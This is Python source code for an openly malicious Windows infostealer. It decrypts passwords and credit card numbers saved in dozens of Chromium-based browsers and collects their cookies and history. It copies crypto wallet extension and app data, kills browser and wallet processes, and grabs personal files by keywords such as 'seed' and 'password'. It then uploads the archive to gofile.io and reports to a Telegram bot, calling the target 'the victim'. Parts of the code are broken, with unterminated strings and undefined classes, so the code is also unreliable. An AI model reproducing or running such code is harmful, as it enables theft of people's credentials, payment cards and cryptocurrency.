import os
import json
import base64
import sqlite3
import psutil
import requests
import platform
import socket
import getpass
import zipfile
import time
import random
from pathlib import Path
from contextlib import suppress

import browser_cookie3 as bc3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData


TELEGRAM_CHAT_ID = ""
TELEGRAM_BOT_TOKEN = "6657156685:_"


class Paths:
  def __init__(self):
    self.temp = Path(os.environ["TEMP"])
    self.appdata_local = Path(os.environ["LOCALAPPDATA"])
    self.appdata_roaming = Path(os.environ["APPDATA"])
    self.userprofile = Path(os.environ["USERPROFILE"])


def upload_gofile(file_path):
  try:
    with open(file_path, "rb") as f:
      files = {"file": f}
      response = requests.post(
        "https://upload.gofile.io/uploadFile", files=files, timeout=500
      )
      if response.status_code == 200:
        result = response.json()
        if result.get("status") == "ok":
          return result["data"]["downloadPage"]
    return None
  except Exception:
    return None


def send_telegram(caption=""):
  if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    return
  try:
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(
      url,
      data={
      "chat_id": TELEGRAM_CHAT_ID,
      "text": caption,
      "parse_mode": "HTML",
    },
      timeout=30,
    )
  except Exception as e:
    print("Telegram Error:", e)


def escape_html(text):
  return str(text).replace("&", "&").replace("<", "<").replace(">", ">")


def get_master_key(local_state_path):
  if not os.path.exists(local_state_path):
    return None
  try:
    with open(local_state_path, "r", encoding="utf-8") as f:
      local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
  except Exception:
    return None


def backup_db(db_path):
  try:
    conn = sqlite3.connect(":memory:")
    disk_conn = sqlite3.connect(db_path)
    disk_conn.backup(conn)
    disk_conn.close()
    return conn, conn.cursor()
  except Exception:
    try:
      conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
      return conn, conn.cursor()
    except Exception:
      return None, None


def decrypt(encrypted_value, master_key):
  if not encrypted_value or not master_key:
    return ""
  try:
    if isinstance(encrypted_value, str):
      encrypted_value = encrypted_value.encode("utf-8")
    if encrypted_value[:3] in (b"v10", b"v11", b"v20"):
      encrypted_value = encrypted_value[3:]
    try:
      nonce = encrypted_value[:12]
      tag = encrypted_value[-16:]
      ciphertext = encrypted_value[12:-16]
      cipher = Cipher(algorithms.AES(master_key), modes.GCM(nonce, tag))
      dec = cipher.decryptor()
      plain = dec.update(ciphertext) + dec.finalize()
      return plain.decode("utf-8", errors="ignore")
    except Exception:
      iv = encrypted_value[:16]
      cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv))
      dec = cipher.decryptor()
      plain = dec.update(encrypted_value[16:]) + dec.finalize()
      pad = plain[-1] & 0xFF
      if 1 <= pad <= 16 and all(b == pad for b in plain[-pad:]):
        plain = plain[:-pad]
      return plain.decode("utf-8", errors="ignore")
  except Exception:
    return ""


def get_system_infos(zip_file):
  infos = False
  space = " "

  def info():
    ip_info = ""
    with suppress(Exception):
      s = requests.get("https://ipinfo.io/json", timeout=10).json()
      for i in s:
        len_i = len(i)
        ip_info += f"    - {i}{space * (20 - len_i)}: {s[i]}\n"
      return ip_info
    return "No IP infos."

  try:
    IPinfos = info()
    cpu_count = psutil.cpu_count(logical=True)
    ram_total = round(psutil.virtual_memory().total / (1024 ** 3), 2)
    disk_usage = psutil.disk_usage("/").percent

    system_infos = f"""
    - hostname      : {socket.gethostname()}
    - username      : {getpass.getuser()}
    - processor     : {platform.processor()}
    - machine       : {platform.machine()}
    - platform      : {platform.platform()}
    - system        : {platform.system()}
    - release       : {platform.release()}
    - version       : {platform.version()}
    - CPU cores     : {cpu_count}
    - RAM total(GB) : {ram_total}
    - Disk usage(%) : {disk_usage}
    - local IP      : {socket.gethostbyname(socket.gethostname())}
    - public IP    : {IPinfos}
    - Network interfaces:
        """
    infos = True
  except:
    system_infos = "No infos."
    infos = False

  zip_file.writestr("system_infos.txt", system_infos)
  return infos, system_infos


def collect(zip_file):
    browsers = []
    number_extensions = 0
    number_passwords = 0
    number_cookies = 0
    number_history = 0
    number_downloads = 0
    number_cards = 0

    file_passwords = []
    file_cookies = []
    file_history = []
    file_downloads = []
    file_cards = []

    path_appdata_local = Paths().appdata_local
    path_appdata_roaming = Paths().appdata_roaming

    profiles = [
      "",
      "Default",
      "Profile 1",
      "Profile 2",
      "Profile 3",
      "Profile 4",
      "Profile 5",
    ]

    chromium_browsers = [
      ("Chrome", os.path.join(path_appdata_local, "Google", "Chrome", "User Data"), "chrome.exe"),
      ("Chromium", os.path.join(path_appdata_local, "Chromium", "User Data"), "chrome.exe"),
      ("Chrome SxS", os.path.join(path_appdata_local, "Google", "Chrome SxS", "User Data"), "chrome.exe"),
      ("Chrome Beta", os.path.join(path_appdata_local, "Google", "Chrome Beta", "User Data"), "chrome.exe"),
      ("Chrome Dev", os.path.join(path_appdata_local, "Google", "Chrome Dev", "User Data"), "chrome.exe"),
      ("Chrome Unstable", os.path.join(path_appdata_local, "Google", "Chrome Unstable", "User Data"), "chrome.exe"),
      ("Chrome Canary", os.path.join(path_appdata_local, "Google", "Chrome Canary", "User Data"), "chrome.exe"),
      ("Edge", os.path.join(path_appdata_local, "Microsoft", "Edge", "User Data"), "msedge.exe"),
      ("Opera", os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable"), "opera.exe"),
      ("Opera GX", os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable"), "opera.exe"),
      ("Opera Neon", os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon"), "opera.exe"),
      ("Brave", os.path.join(path_appdata_local, "BraveSoftware", "Brave-Browser", "User Data"), "brave.exe"),
      ("Vivaldi", os.path.join(path_appdata_local, "Vivaldi", "User Data"), "vivaldi.exe"),
      ("Amigo", os.path.join(path_appdata_local, "Amigo", "User Data"), "amigo.exe"),
      ("Torch", os.path.join(path_appdata_local, "Torch", "User Data"), "torch.exe"),
      ("Kometa", os.path.join(path_appdata_local, "Kometa", "User Data"), "kometa.exe"),
      ("Orbitum", os.path.join(path_appdata_local, "Orbitum", "User Data"), "orbitum.exe"),
      ("Cent Browser", os.path.join(path_appdata_local, "CentBrowser", "User Data"), "centbrowser.exe"),
      ("7Star", os.path.join(path_appdata_local, "7Star", "7Star", "User Data"), "7star.exe"),
      ("Sputnik", os.path.join(path_appdata_local, "Sputnik", "Sputnik", "User Data"), "sputnik.exe"),
      ("Epic Privacy Browser", os.path.join(path_appdata_local, "Epic Privacy Browser", "User Data"), "epic.exe"),
      ("Uran", os.path.join(path_appdata_local, "uCozMedia", "Uran", "User Data"), "uran.exe"),
      ("Yandex", os.path.join(path_appdata_local, "Yandex", "YandexBrowser", "User Data"), "yandex.exe"),
      ("Yandex Canary", os.path.join(path_appdata_local, "Yandex", "YandexBrowserCanary", "User Data"), "yandex.exe"),
      ("Yandex Developer", os.path.join(path_appdata_local, "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
      ("Yandex Beta", os.path.join(path_appdata_local, "Yandex", "YandexBrowserBeta", "User Data"), "yandex.exe"),
      ("Yandex Tech", os.path.join(path_appdata_local, "Yandex", "YandexBrowserTech", "User Data"), "yandex.exe"),
      ("Yandex SxS", os.path.join(path_appdata_local, "Yandex", "YandexBrowserSxS", "User Data"), "yandex.exe"),
      ("Iridium", os.path.join(path_appdata_local, "Iridium", "User Data"), "iridium.exe"),
      ("Slimjet", os.path.join(path_appdata_local, "Slimjet", "User Data"), "slimjet.exe"),
      ("Comodo Dragon", os.path.join(path_appdata_local, "Comodo", "Dragon", "User Data"), "dragon.exe"),
      ("Falkon", os.path.join(path_appdata_local, "Falkon"), "falkon.exe"),
      ("Naver Whale", os.path.join(path_appdata_local, "Naver", "Whale", "User Data"), "whale.exe"),
      ("SRWare Iron", os.path.join(path_appdata_local, "SRWare Iron", "User Data"), "iron.exe"),
      ("Coc Coc", os.path.join(path_appdata_local, "CocCoc", "Browser", "User Data"), "coccoc.exe"),
      ("Polarity", os.path.join(path_appdata_local, "Polarity", "User Data"), "polarity.exe"),
      ("Javelin Browser", os.path.join(path_appdata_local, "Javelin", "User Data"), "javelin.exe"),
      ("Chedot", os.path.join(path_appdata_local, "Chedot", "User Data"), "chedot.exe"),
      ("Lunascape", os.path.join(path_appdata_local, "Lunascape", "User Data"), "lunascape.exe"),
      ("Otter Browser", os.path.join(path_appdata_local, "Otter Browser", "User Data"), "otter.exe"),
      ("DuckDuckGo Browser", os.path.join(path_appdata_local, "DuckDuckGo", "User Data"), "duckduckgo.exe"),
      ("Tutanota", os.path.join(path_appdata_local, "Tutanota", "User Data"), "tutanota.exe"),
      ("SafeGuard Browser", os.path.join(path_appdata_local, "SafeGuard", "User Data"), "safeguard.exe"),
      ("XBrowser", os.path.join(path_appdata_local, "XBrowser", "User Data"), "xbrowser.exe"),
      ("WebCat", os.path.join(path_appdata_local, "WebCat", "User Data"), "webcat.exe")
    ]

    ext_ids = {
      "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
      "ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask-edge",
      "fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
      "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
      "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
      "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
      "aholpfdialjgjfhomihkjbmgjidlcdno": "Exodus",
      "aeachknmefphepccionboohckonoeemg": "Coin98",
      "pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
      "aiifbnbfobpmeekipheeijimdpnlpgpp": "TerraStation",
      "amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
      "fnnegphlobjdpkhecapkijjdkgcjhkib": "Harmony",
      "lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
      "efbglgofoippbgcjepnhiblaibcnclgk": "Martian Aptos",
      "jnlgamecbpmbajjfhmmmlhejkemejdma": "Braavos",
      "hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
      "ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
      "nphplpgoakhhjchkkhmiggakijnkhfnd": "TON",
      "bhghoamapcdpbohphigoooaddinpkbai": "Authenticator",
      "ibnejdfjmmkpcnlpebklmnkoeoihofec": "Tron",
      "lnaonmdpfhbgmhbmhlbbnhegggijcfcg": "Trezor",
      "knjilbhbkmjdjgaebdcejjlmnpagjmei": "Ledger",
      "mbndjliiknpfmpanccheokhdbbmdaaei": "Mycelium",
      "eimcpmfpjgojopihlhfjkaklpfkmhglp": "TrustWallet1",
      "egjidjbpglichdcondbcbdnbeeppgdph": "TrustWallet2",
      "klkbpbgfplbofepkbkaodljfifmohokb": "Ellipal",
      "cimfefinodkjoijcbgffjnmklmnngjge": "Argent",
      "jbecljpfobbfnhmpgbdgmjajmbgdckgj": "Dapper",
      "neihkdpkimcjokhblhpfnjmfklkpjkpj": "Curve",
      "dofnkedmjpfpjncpgijbffklkmdolnkk": "SushiSwap",
      "jgfjjpnnphjkjiecligjdnfmbmhbajpm": "Uniswap",
      "bfbijoiifjbkbbajgjgdkmceibjlcbj": "1inch",
      "hlbocmgldbcopjfhfmicmdhngbkjdgmj": "Aave",
      "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
      "ppbibelpcjmhbdihakflkdcoccbgbkpo": "Unisat Wallet",
      "ejjladinnckdgjemekebdpeokbikhfci": "Petra",
      "nfdgfjplkllcbmnlpnfkpidijlnfjfjj": "BitKeep",
      "enabgbdfcbaehmbigakijjabdpdnimlg": "Manta",
      "ppdadbejkmjnefldpcdjhnkpbjkikoip": "Rose",
      "pdgbckgdncnhihllonhnjbdoighgpimk": "Wallet Guard",
      "onhogfjeacnfoofkfgppdlbmlmnplgbn": "SubWallet",
      "dlcobpjiigpikoobohmabe...": "Argent X",
      "bmnjpfboeieiejchjibfbaiidbdgknjl": "Blockchain Wallet",
      "hifafgmccdpekplomjjkcfgodnhcellj": "Crypto.com",
      "hekjcgjfhbldlcfbjdfpmhkjjpmppjcf": "Zerion",
    }

    def kill_processes(process_names, attempts=1, delay=0):
      for _ in range(attempts):
        for proc in psutil.process_iter(["pid", "name"]):
          try:
            if proc.info["name"].lower() in [n.lower() for n in process_names]:
              proc.kill()
          except Exception:
            pass
        if delay:
          time.sleep(delay)

    def extract_extensions(zip_file, profile_path, browser_name):
      nonlocal number_extensions
      ext_folder = os.path.join(profile_path, "Local Extension Settings")
      if not os.path.exists(ext_folder):
        return
      for ext_id in os.listdir(ext_folder):
        if ext_id in ext_ids:
          number_extensions += 1
          ext_name = ext_ids[ext_id]
          src = os.path.join(ext_folder, ext_id)
          if os.path.isdir(src):
            for root, _, files in os.walk(src):
              for file in files:
                abs_path = os.path.join(root, file)
                arcname = os.path.join("Extensions", browser_name, f"{ext_name}_{ext_id}", os.path.relpath(abs_path, src))
                try:
                  zip_file.write(abs_path, arcname)
                except Exception:
                  pass

    def wallet_files(zip_file):
      wallet_names = []
      entries = [
        ("Zcash", os.path.join(path_appdata_roaming, "Zcash"), "zcash.exe),
        ("Armory", os.path.join(path_appdata_roaming, "Armory"), "armory.exe),
        ("Bytecoin", os.path.join(path_appdata_roaming, "bytecoin"), "bytecoin.exe),
        ("Guarda", os.path.join(path_appdata_roaming, "Guarda", "Local Storage", "leveldb"), "guarda.exe),
        ("Atomic Wallet", os.path.join(path_appdata_roaming, "atomic", "Local Storage", "leveldb"), "atomic.exe),
        ("Exodus", os.path.join(path_appdata_roaming, "Exodus", "exodus.wallet"), "exodus.exe),
        ("Binance", os.path.join(path_appdata_roaming, "Binance", "Local Storage", "leveldb"), "binance.exe),
        ("Jaxx Liberty", os.path.join(path_appdata_roaming, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe),
        ("Electrum", os.path.join(path_appdata_roaming, "Electrum), "electrum.exe),
        ("Coinomi", os.path.join(path_appdata_roaming, "Coinomi", "Coinomi), "coinomi.exe),
        ("Trust Wallet", os.path.join(path_appdata_roaming, "Trust Wallet"), "trustwallet.exe),
        ("AtomicDEX", os.path.join(path_appdata_roaming, "AtomicDEX"), "atomicdex.exe),
        ("Wasabi Wallet", os.path.join(path_appdata_roaming, "WalletWasabi), "wasabi.exe),
        ("Ledger Live", os.path.join(path_appdata_roaming, "Ledger Live"), "ledgerlive.exe),
        ("Trezor Suite", os.path.join(path_appdata_roaming, "Trezor", "suite"), "trezor.exe),
        ("Blockchain Wallet", os.path.join(path_appdata_roaming, "Blockchain", "Wallet"), "blockchain.exe),
        ("Mycelium", os.path.join(path_appdata_roaming, "Mycelium), "mycelium.exe),
        ("Crypto.com", os.path.join(path_appdata_roaming, "Crypto.com", "appdata"), "crypto.com.exe),
        ("BRD", os.path.join(path_appdata_roaming, "BRD), "brd.exe),
        ("Coinbase Wallet", os.path.join(path_appdata_roaming, "Coinbase", "Wallet"), "coinbase.exe),
        ("Zerion", os.path.join(path_appdata_roaming, "Zerion), "zerion.exe)
      ]

      try:
        for name, path, proc_name, category in entries:
          if category == "Wallets":
            for proc in psutil.process_iter(["pid", "name"]):
              try:
                if proc.info["name"].lower() == proc_name.lower():
                  proc.kill()
              except Exception:
                pass
      except Exception:
        pass

      for name, path, proc_name, category in entries:
        if os.path.exists(path):
          try:
            if category == "Wallets":
              wallet_names.append(name)

            zip_file.writestr(os.path.join("Session Files", name, "path.txt"), path)

            if os.path.isdir(path):
              for root, _, files in os.walk(path):
                for file in files:
                  abs_file_path = os.path.join(root, file)
                  rel_path_in_zip = os.path.join("Session Files", name, "Files", os.path.relpath(abs_file_path, path))
                  try:
                    zip_file.write(abs_file_path, rel_path_in_zip)
                  except Exception:
                    pass
            else:
              rel_path_in_zip = os.path.join("Session Files", name, "Files", os.path.basename(path))
              try:
                zip_file.write(path, rel_path_in_zip)
              except Exception:
                pass
          except Exception:
            pass

      return ", ".join(wallet_names) if wallet_names else ""

    browser_procs = [
      "chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "vivaldi.exe",
      "yandex.exe", "slimjet.exe", "epic.exe", "dragon.exe", "centbrowser.exe",
      "falkon.exe", "whale.exe", "iron.exe", "torch.exe", "coccoc.exe",
      "polarity.exe", "javelin.exe", "orbit.exe", "chedot.exe", "lunascape.exe",
      "otter.exe", "duckduckgo.exe", "safeguard.exe",
      "xbrowser.exe", "webcat.exe", "flynx.exe",
      "midori.exe", "surf.exe", "qute-browser.exe",
      "otter-browser.exe", "arora.exe", "qupzilla.exe", "kometa.exe",
      "puffin.exe", "epiphany.exe",
      "webpositive.exe", "nexx.exe", "ibrowsr.exe", "superbird.exe", "rockmelt.exe",
      "hotdog.exe", "freedom.exe", "flashpeak.exe", "slimbrowser.exe", "nanoweb.exe",
      "datafox.exe", "cyberfox.exe", "reborn.exe", "charm.exe",
      "fossa.exe", "penguin.exe", "novel.exe", "celtic.exe", "polyweb.exe",
    ]

    for name, path, proc_name in chromium_browsers:
      if not os.path.exists(path):
        continue
      local_state_path = os.path.join(path, "Local State")
      master_key = get_master_key(local_state_path)
      if not master_key:
        continue

      wallet_files(zip_file)

      for profile in profiles:
        profile_path = os.path.join(path, profile)
        if not os.path.exists(profile_path):
          continue

        extract_extensions(zip_file, profile_path, name)

        password_db = os.path.join(profile_path, "Login Data")
        if os.path.exists(password_db):
          try:
            conn, cur = backup_db(password_db)
            if cur:
              cur.execute("SELECT action_url, username_value, password_value FROM logins")
              for row in cur.fetchall():
                if not row[0] or not row[2]:
                  continue
                pw = decrypt(row[2], master_key)
                if not pw:
                  continue
                file_passwords.append(
                  f"- Url      : {row[0]}\n  Username : {row[1]}\n  Password : {pw}\n  Browser  : {name}\n"
                )
                number_passwords += 1
              conn.close()
          except Exception:
            pass

        cookie_db = os.path.join(profile_path, "Network", "Cookies")
        if os.path.exists(cookie_db):
          try:
            cj = bc3.chrome(cookie_file=cookie_db, key_file=local_state_path)
            for c in cj:
              file_cookies.append({
                "browser": name,
                "domain": c.domain,
                "name": c.name,
                "path": c.path,
                "value": c.value,
                "expires": int(c.expires) if c.expires else 0,
              })
              number_cookies += 1
          except Exception:
            pass

        history_db = os.path.join(profile_path, "History")
        if os.path.exists(history_db):
          try:
            conn, cur = backup_db(history_db)
            if cur:
              cur.execute("SELECT url, title, last_visit_time FROM urls")
              for row in cur.fetchall():
                if not row[0] or not row[1] or not row[2]:
                  continue
                file_history.append(
                  f"- Url     : {row[0]}\n  Title   : {row[1]}\n  Time    : {row[2]}\n  Browser : {name}\n"
                )
                number_history += 1
              conn.close()
          except Exception:
            pass

        downloads_db = os.path.join(profile_path, "History")
        if os.path.exists(downloads_db):
          try:
            conn, cur = backup_db(downloads_db)
            if cur:
              cur.execute("SELECT tab_url, target_path FROM downloads")
              for row in cur.fetchall():
                if not row[0] or not row[1]:
                  continue
                file_downloads.append(
                  f"- Path    : {row[1]}\n  Url     : {row[0]}\n  Browser : {name}\n"
                )
                number_downloads += 1
              conn.close()
          except Exception:
            pass

        cards_db = os.path.join(profile_path, "Web Data")
        if os.path.exists(cards_db):
          try:
            conn, cur = backup_db(cards_db)
            if cur:
              cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")
              for row in cur.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                  continue
                card = decrypt(row[3], master_key)
                if not card:
                  continue
                file_cards.append(
                  f"- Name             : {row[0]}\n  Expiration Month : {row[1]}\n  Expiration Year  : {row[2]}\n  Card Number      : {card}\n  Date Modified    : {row[4]}\n  Browser          : {name}\n"
                )
                number_cards += 1
              conn.close()
          except Exception:
            pass

      if name not in browsers:
        browsers.append(name)

    if not file_passwords:
      file_passwords = "No passwords was found on the victim's computer."
    else:
      file_passwords = "\n".join(file_passwords)

    if not file_cookies:
      file_cookies_json = json.dumps([{"message": "No cookies was found on the victim's computer."}], indent=2)
    else:
      file_cookies_json = json.dumps(file_cookies, indent=2, ensure_ascii=False)

    if not file_history:
      file_history = "No history was found on the victim's computer."
    else:
      file_history = "\n".join(file_history)

    if not file_downloads:
      file_downloads = "No downloads was found on the victim's computer."
    else:
      file_downloads = "\n".join(file_downloads)

    if not file_cards:
      file_cards = "No cards was found on the victim's computer."
    else:
      file_cards = "\n".join(file_cards)

    zip_file.writestr(f"Passwords ({number_passwords}).txt", file_passwords)
    zip_file.writestr(f"Cookies ({number_cookies}).json", file_cookies_json)
    zip_file.writestr(f"Cards ({number_cards}).txt", file_cards)
    zip_file.writestr(f"Browsing History ({number_history}).txt", file_history)
    zip_file.writestr(f"Download History ({number_downloads}).txt", file_downloads)

    return (
      number_extensions,
      number_passwords,
      number_cookies,
      number_history,
      number_downloads,
      number_cards,
    )

  @staticmethod
  def Interesting_Files(zip_file):
    path_userprofile = Paths().userprofile
    path_appdata_roaming = Paths().appdata_roaming
    extensions = (
      ".txt", ".log", ".ini", ".json", ".xml", ".csv", ".md", ".rtf", ".cfg", ".conf",
      ".png", ".jpg", ".jpeg", ".bmp", ".gif", ".tiff", ".svg", ".webp",
      ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".zip",
    )

    paths = [
      os.path.join(path_userprofile, "Desktop"),
      os.path.join(path_userprofile, "Photos"),
      os.path.join(path_appdata_roaming, "Microsoft", "Windows", "Recent"),
    ]

    keywords = [
      "2fa", "mfa", "2step", "otp", "verification", "verif", "verify",
      "acount", "account", "compte", "identifiant", "login", "conta", "contas",
      "personnel", "personal", "perso", "banque", "bank", "funds", "fonds",
      "paypal", "casino", "banco", "saldo", "crypto", "cryptomonnaie",
      "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask",
      "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor",
      "seed", "seed phrase", "phrase de récupération", "recovery", "récupération",
      "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique",
      "passphrase", "phrase secrète", "wallet key", "clé de portefeuille",
      "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille",
      "private key", "clé privée", "keystore", "trousseau", "json",
      "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain",
      "bnb", "usdt", "telegram", "disc", "discord", "token", "tkn", "webhook",
      "api", "bot", "tokendisc", "key", "clé", "cle", "keys", "private", "prive",
      "privé", "secret", "steal", "voler", "access", "auth", "mdp", "motdepasse",
      "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd",
      "passwords", "senha", "senhas", "data", "donnée", "donnee", "donnees",
      "details", "confidential", "confidentiel", "sensitive", "sensible",
      "important", "privilege", "privilège", "vault", "safe", "locker",
      "protection", "hidden", "caché", "cache", "identity", "identité",
      "passport", "passeport", "permis", "pin", "nip", "leak", "dump",
      "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
      "db", "database" "master", "admin", "administrator", "administrateur",
      "root", "owner", "propriétaire", "proprietaire", "keyfile", "keystore",
      "seedphrase", "recoveryphrase", "privatekey", "publickey", "accountdata",
      "userdata", "logininfo", "seedbackup", "backup", "dados", "documento",
      "documentos", "WhatsApp", "whatsapp", "Telegram", "telegram",
    ]

    name_files = []

    for path in paths:
      for root, dirs, files in os.walk(path):
        for file in files:
          try:
            if file.lower().endswith(extensions):
              file_name_no_ext = os.path.splitext(file)[0].lower()
              for keyword in keywords:
                try:
                  if keyword.lower() == file_name_no_ext:
                    full_path = os.path.join(root, file)
                    if os.path.exists(full_path):
                      name_files.append(file)
                      base_name, ext = os.path.splitext(file)
                      with open(full_path, "rb") as f:
                        zip_file.writestr(
                          os.path.join(
                          "Interesting Files",
                          base_name
                          + f"_{random.randint(1, 9999)}"
                          + ext,
                        ),
                          f.read(),
                        )
                    break
                except:
                  pass
          except:
            pass

    if name_files:
      number_files = sum(len(phrase.split()) for phrase in name_files)
    else:
      number_files = 0

    return number_files


def main():
  zip_file_path = os.path.join(Paths().temp, "browser_data.zip")

  with zipfile.ZipFile(zip_file_path, "w") as zip_file:
    _, system_info = get_system_infos(zip_file)
    ext, pw, ck, hi, dl, cd = BrowserData.collect(zip_file)
    BrowserData.Interesting_Files(zip_file)

  print(f"Extensions: {ext}\nPasswords: {pw}\nCookies: {ck}\nHistory: {hi}\nDownloads: {dl}\nCards: {cd}")

  gofile_url = upload_gofile(zip_file_path)

  msg = (
    "🎯 <b>{getpass.getuser()}Got somethng For You</b>\n\n"
    f"🔌 <b>Extensions:</b> <code>{escape_html(ext)}</code>\n"
    f"🔐 <b>Passwords:</b> <code>{escape_html(pw)}</code>\n"
    f"🍪 <b>Cookies:</b> <code>{escape_html(ck)}</code>\n"
    f"🌐 <b>History:</b> <code>{escape_html(hi)}</code>\n"
    f"📥 <b>Downloads:</b> <code>{escape_html(dl)}</code>\n"
    f"💳 <b>Cards:</b> <code>{escape_html(cd)}</code>\n\n"
    f"📦 <b>Download URL:</b>\n<code>{escape_html(gofile_url)}</code>"
  )

  send_telegram(msg)

  try:
    os.remove(zip_file_path)
  except Exception:
    pass


if __name__ == "__main__":
  main()
